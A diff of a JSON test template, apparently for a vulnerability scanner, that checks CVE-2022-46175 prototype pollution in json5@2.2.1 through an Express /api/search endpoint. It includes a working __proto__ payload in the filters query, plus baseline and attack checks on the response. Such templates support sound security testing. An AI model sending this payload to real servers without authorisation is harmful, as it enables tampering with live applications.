@@ -1,22 +1,58 @@
 {
   "templateId": "json5-inherited-filter-template",
   "title": "JSON5 상속 검색 필터 점검",
-  "description": "대한대학교 json5@2.2.1의 CVE-2022-46175 경로를 GET /api/search?filters= 로 확인합니다. 기준 요청 filters={} 과 비교해 상속된 type=notice 및 limit=1이 결과 1건에 적용되는지 봅니다. 반환 객체의 프로토타입에 관한 현상이며 전역 Object.prototype 오염이나 권한 상승으로 확대하지 않습니다.",
+  "description": "json5@2.2.1의 CVE-2022-46175 경로를 GET /api/search?filters= 로 확인합니다. 기준 요청 filters={} 과 비교해 상속된 type=notice 및 limit=1이 결과 1건에 적용되는지 봅니다. 반환 객체의 프로토타입에 관한 현상이며 전역 Object.prototype 오염이나 권한 상승으로 확대하지 않습니다.",
   "sessionRole": "public",
-  "fixtures": ["vul-web2-daehan"],
-  "attackType": { "name": "prototype_pollution", "cwe": "CWE-1321" },
-  "dependency": { "runtime": "node", "framework": "express", "library": "json5" },
-  "target": { "method": "GET", "endpoint": "/api/search" },
-  "request": { "packet": { "method": "GET", "path": "/api/search", "query": { "filters": "{{payload}}" } } },
-  "blanks": {
-    "origin": { "required": true, "type": "url" },
-    "payload": { "required": true, "type": "string", "pickFrom": "payloads", "desc": "filters 쿼리 값입니다. 기준 요청은 filters={} 입니다." }
+  "attackType": {
+    "name": "prototype_pollution",
+    "cwe": "CWE-1321"
   },
-  "payloads": ["{__proto__:{type:\"notice\",limit:1}}"],
+  "dependency": {
+    "runtime": "node",
+    "framework": "express",
+    "library": "json5"
+  },
+  "target": {
+    "method": "GET",
+    "endpoint": "/api/search"
+  },
+  "request": {
+    "packet": {
+      "method": "GET",
+      "path": "/api/search",
+      "query": {
+        "filters": "{{payload}}"
+      }
+    }
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url"
+    },
+    "payload": {
+      "required": true,
+      "type": "string",
+      "pickFrom": "payloads",
+      "desc": "filters 쿼리 값입니다. 기준 요청은 filters={} 입니다."
+    }
+  },
+  "payloads": [
+    "{__proto__:{type:\"notice\",limit:1}}"
+  ],
   "verify": {
     "mode": "inheritedFilter",
-    "baseline": { "status": 200, "query": { "filters": "{}" } },
-    "attack": { "status": 200, "expect": 1, "contains": "\"type\":\"notice\"" }
+    "baseline": {
+      "status": 200,
+      "query": {
+        "filters": "{}"
+      }
+    },
+    "attack": {
+      "status": 200,
+      "expect": 1,
+      "contains": "\"type\":\"notice\""
+    }
   },
   "executor": "guardrail",
   "trust": "unverified"
